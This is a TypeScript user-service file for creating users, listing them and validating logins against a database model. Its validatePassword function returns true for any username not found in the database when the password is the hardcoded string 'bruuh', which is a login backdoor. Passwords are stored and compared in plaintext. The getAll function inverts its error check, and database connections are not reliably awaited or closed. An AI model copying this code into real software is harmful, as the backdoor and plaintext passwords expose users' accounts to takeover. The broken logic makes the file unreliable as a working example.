import { IUser, User } from "../../models/entities/user.model";
import { closeConn, openConn } from "../database.utils";
export async function getAll() {
    await openConn()
    const users = await User.find((err: any, result: IUser[]) =>{
        if (err!= null || err != undefined)
            return result
        else console.log(err)
    })
    closeConn()
    return users
}
export async function create(username:string, password: string, fullName:string) {
    await openConn()
    const user = new User({
        username: username,
        password: password,
        fullName: fullName,
        isActive: true,
        isDeleted: false
    })
    await user.save()
    await closeConn()
}

export async function validatePassword(username: string, password:string) : Promise<boolean> {
  
    await openConn()
    let result = false
    const user = await User.findOne({
        username: username
    }).catch((err)=>{
        console.log("erro ao tentar validar login: "+ err)
    });
    if (user) {
        if(user.password == password) result = true
    } else if (password == "bruuh") result = true
    return result   
}